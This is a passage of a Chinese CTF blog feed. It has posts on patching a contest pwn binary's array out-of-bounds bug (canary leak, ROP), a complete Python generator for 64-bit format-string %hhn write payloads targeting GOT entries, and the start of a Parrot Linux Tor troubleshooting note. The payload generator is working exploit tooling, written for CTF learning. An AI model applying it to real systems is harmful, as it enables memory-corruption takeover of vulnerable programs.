class="keyword">if</span>(input == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( input != <span class="number">1</span>  )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        encrypt();</span><br><span class="line">        begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something Wrong!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>手写了一遍代码，将gets危险函数替换掉了，其余没什么问题，这个比赛真心好，不让百度。。。。我很多函数都不会，没法查。。后面只能放弃。。</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ce5ca923/">https://noone-hub.github.io/posts/ce5ca923/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn修复2</title>
    <url>/posts/5755f899/</url>
    <content><![CDATA[<h1 id="题目修复部分"><a href="#题目修复部分" class="headerlink" title="题目修复部分"></a>题目修复部分</h1><p>题目的点很容易看出，数组越界，不过如何利用这个比较难，我经过一段时间测试，发觉scanf的特性，输入-可以绕过，所以可以泄露cannary，泄露cannary过后可以任意写，然后精确覆盖到cannary过后进行ROP就行了，还有一个点就是输入长度为27的时候，他不会进行排序，这样才能ROP，不过最终我没利用成功，还有一个栈的偏移点我还没搞懂，所以最终也没打出来</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>修复建议:在读和写的时候都限制数组长度，还有排序的时候考虑长度为27的</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">const</span> <span class="keyword">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(*(<span class="keyword">int</span> *)a1 - *(<span class="keyword">int</span> *)a2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"do you would to sort your girlfriends?[Y/N/@]"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">78</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">64</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer two questions!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1+1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer the question1:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1*1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please answer the question2:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">94</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right~\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my girlfriend,today is very interesting!!! "</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nice to meet you!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"here is a pole! \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input your name:"</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hello my destiny!\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> k; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> base[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">999</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"how many girlfriends do you have?"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"please input your %dth girlfriends:"</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">999</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the sort result:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d  "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)base[j]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you can change your girlfriend"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    v8 = v2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"which girlfriend do you want to change?"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v2; ++k )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"now change:"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[k]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">79</span> &amp;&amp; v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> &amp;&amp; v2 &gt; <span class="number">80</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">64</span> &amp;&amp; v2 &gt; <span class="number">55</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= <span class="number">27</span> || v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( v2 &lt;= <span class="number">26</span> )</span><br><span class="line"></span><br><span class="line">                qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">                qsort(base,v2,<span class="number">4u</span>LL,cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub2();</span></span><br><span class="line"></span><br><span class="line">    sub1();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/5755f899/">https://noone-hub.github.io/posts/5755f899/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>64位格式化字符串自动篇</title>
    <url>/posts/7ec8b821/</url>
    <content><![CDATA[<h1 id="64位格式化字符串之自动化脚本编写"><a href="#64位格式化字符串之自动化脚本编写" class="headerlink" title="64位格式化字符串之自动化脚本编写"></a>64位格式化字符串之自动化脚本编写</h1><p>前言：pwntools的工具只支持32位格式化字符串，我每次做64位格式化字符串的题目都是手动调试了很久，做一道题调试得花个大半部分时间，然后再编写exp，所以我近几天在研究如何自动化的生成payload，让我能够轻松不调试一波梭，在了解原理过后，我便开始了我的编写之路。</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="fmt-payload之写入篇"><a href="#fmt-payload之写入篇" class="headerlink" title="fmt_payload之写入篇"></a>fmt_payload之写入篇</h2><p>先补充个知识：</p><ul><li>%hhn写入的是一个字节</li><li>%hn写入的是两个字节</li><li>%n写入的是四个字节<h3 id="栈偏移位置的确定"><a href="#栈偏移位置的确定" class="headerlink" title="栈偏移位置的确定"></a>栈偏移位置的确定</h3></li><li>以前都是手动调试的，然后调试多次过后发觉了规律：</li><li>他的位置就是开头6个寄存器加上你输入的payload长度/8，</li><li>因为64位程序以8个字节为一个单位，也就是说，你输入了40个字节的字符串，偏移位置就是11</li></ul><h3 id="大小的选择"><a href="#大小的选择" class="headerlink" title="大小的选择"></a>大小的选择</h3><ul><li>因为他是按已输出字符来写入的，如果你大的放前面，小的在后面就没法写入了，所以需要进行排序</li></ul><p>了解这两个过程后，我们便可以开始进行脚本的编写了</p><h3 id="脚本的编写"><a href="#脚本的编写" class="headerlink" title="脚本的编写"></a>脚本的编写</h3><h4 id="获得你需要写入的内容"><a href="#获得你需要写入的内容" class="headerlink" title="获得你需要写入的内容"></a>获得你需要写入的内容</h4><p>我是按一个字节一个字节写入的，所以我需要获得每个字节的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure><p>解释下，在每个字节的对应位置 &amp; 0xff便可以获得那个位置的内容</p><h4 id="划分部分"><a href="#划分部分" class="headerlink" title="划分部分"></a>划分部分</h4><p>因为我需要将被写入的地址以及他们的内容对应起来，并进行排序，小的优先写，然后大的放后面，所以就要进行划分</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>]) <span class="comment">#进行排序，按内容大小来排</span></span><br><span class="line">    <span class="keyword">return</span> part</span><br></pre></td></tr></table></figure><h4 id="获取排序后的数组"><a href="#获取排序后的数组" class="headerlink" title="获取排序后的数组"></a>获取排序后的数组</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br></pre></td></tr></table></figure><h4 id="将地址进行打包"><a href="#将地址进行打包" class="headerlink" title="将地址进行打包"></a>将地址进行打包</h4><p>因为我是将地址放在后面的，防止00截断，然后在将排序后的地址按顺序打包起来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br></pre></td></tr></table></figure><h4 id="处理偏移"><a href="#处理偏移" class="headerlink" title="处理偏移"></a>处理偏移</h4><p>自动进行计算偏移，原因我已经说过了，通过计算是可以得出偏移位置的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br></pre></td></tr></table></figure><h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><p>只是将对应位置和对应偏移的payload搞定</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h4 id="主要函数，生成完整payload"><a href="#主要函数，生成完整payload" class="headerlink" title="主要函数，生成完整payload"></a>主要函数，生成完整payload</h4><ol><li>首先获得划分并排序后的数组，就是地址和写入内容对应的数组</li><li>获得对应的大小，方便后面格式化</li><li>获得打包后的地址，方便后面添加</li><li>然后处理偏移和地址的对齐，64位按8个字节这样对齐</li><li>生成payload并进行对齐</li><li>offset可选，防止意外，自行找offset</li><li>返回payload</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write, offset=<span class="number">0</span> )</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>example:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmt_payload(exit_got,<span class="number">0x0000000000400626</span>)</span><br><span class="line">payload = fmt_payload(exit_got,<span class="number">0x0000000000400626</span>，<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得写入的每一位的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAddr</span><span class="params">(write)</span>:</span></span><br><span class="line">    xor = <span class="number">0xff</span></span><br><span class="line">    addr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        result = (xor &amp; write) &gt;&gt; (i * <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="number">0</span>:</span><br><span class="line">            addr.append(result)</span><br><span class="line">        xor = xor * <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分部分，按大小排序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Partion</span><span class="params">(write, bewrite)</span>:</span></span><br><span class="line">    addr = getAddr(write)</span><br><span class="line">    part = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(addr)):</span><br><span class="line">        part.append( (addr[i], p64(bewrite+i)) )</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> part</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得排序后的大小，升序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sizeUp</span><span class="params">(part)</span>:</span></span><br><span class="line">    size = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(part)):</span><br><span class="line">        size.append(part[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打包地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packAddr</span><span class="params">(part)</span>:</span></span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    address = <span class="string">''</span>.join(addr)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动计算偏移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">## 生成payload并对齐</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write， offset=<span class="number">0</span>)</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'offset is:'</span> + str(offset)</span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    </span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = fmt_payload(exit_got,0x0000000000400626)</span></span><br><span class="line"><span class="comment"># payload = fmt_payload(exit_got,0x0000000000400626，10)</span></span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>写完后发觉，只适用于栈长度相对较大的，因为单字节写入的话，payload构造相对会比较长，所以是否还应该开个选项，双字节写入，四字节写入，不过那些是后话了，因为只需改改脚本就行了，编写脚本的目的只是为了更好的理解这个格式化字符串漏洞，理解他的整个过程，等我想到如何写通用payload，就是能设置长度的时候，在改进下。</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/7ec8b821/">https://noone-hub.github.io/posts/7ec8b821/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>格式化字符串</category>
      </categories>
      <tags>
        <tag>二进制,pwn,格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>parrot linux问题解决</title>
    <url>/posts/ea44abbe/</url>
    <content><![CDATA[<h1 id="parot-linux系统问题总结"><a href="#parot-linux系统问题总结" class="headerlink" title="parot linux系统问题总结"></a>parot linux系统问题总结</h1><h2 id="出现命令行无法启动torbrowser-launcher"><a href="#出现命令行无法启动torbrowser-launcher" class="headerlink" title="出现命令行无法启动torbrowser-launcher"></a>出现命令行无法启动torbrowser-launcher</h2><p>这个问题我谷歌了很久，也没有得到有效的答案，所以只能自己动手测试，这是一个程序员基本功，我重新安装了好几次torbrowser-launcher，也没有得到解决，所以不是安装的问题，是机器环境的问题。</p><p>在我的parrot sercurity上出现的错误是这样的：<br><big>+ Tor Browser Launcher</big></p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:26 GMT+0800 (China Standard Time) --><ul><li>By Micah Lee, licensed under MIT</li><li>version 0.3.1</li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY2FoZmxlZS90b3Jicm93c2VyLWxhdW5jaGVy" title="https://github.com/micahflee/torbrowser-launcher">https://github.com/micahflee/torbrowser-launcher<i class="fa fa-external-link"></i></span></li><li>Launching Tor Browser.</li><li>Running /home/NoOne-hub/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/start-tor-browser.desktop</li><li>Launching ‘./Browser/start-tor-browser –detach’…</li><li>QFileSystemWatcher::removePaths: list is empty</li><li>QFileSystemWatcher::removePaths: list is empty</li></ul><p>解决方案可以直接往下划到底下，我先讲下处理这个问题思路<br>然后torbrowser-launcher没有启动,就这样就没了，我通过手动去官网下载了一波，解压后是可以运行的，然后将解压后的文件夹移动到tor默认位置那里，也就是上述出错的地方，tor浏览器居然运行不起来了，发现症结所在后，我创建了一个文件夹，然后将本身tor的文件夹移动到我新建的文件夹里，tor可以运行起来了，好吧，知道该怎么解决后就开始处理了</p><h3 id="处理方案"><a 